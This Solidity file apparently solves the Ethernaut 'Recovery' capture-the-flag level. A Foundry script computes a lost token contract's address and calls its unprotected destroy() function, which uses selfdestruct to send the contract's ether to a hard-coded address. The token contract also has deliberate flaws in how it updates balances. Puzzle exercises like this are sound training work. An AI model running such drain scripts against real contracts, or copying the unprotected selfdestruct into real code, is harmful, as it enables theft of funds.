// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/console.sol";
import "forge-std/Script.sol";


contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] - _amount;
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}

contract DeployScript is Script {
    function setUp() public view {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        address recovery = 0x198e8c8e00948226550b4FCe3Af34A5dad823c6c;
        console.log("recovery address: %s", recovery);
        address tokenContract = address(uint160(uint256(
            keccak256(abi.encodePacked(
                bytes1(0xd6), bytes1(0x94), recovery, bytes1(0x01)
            ))
        )));
        SimpleToken tokenInstance = SimpleToken(payable(tokenContract));
        tokenInstance.destroy(payable(0xCd5EBC2dD4Cb3dc52ac66CEEcc72c838B40A5931));
        vm.stopBroadcast();
    }
}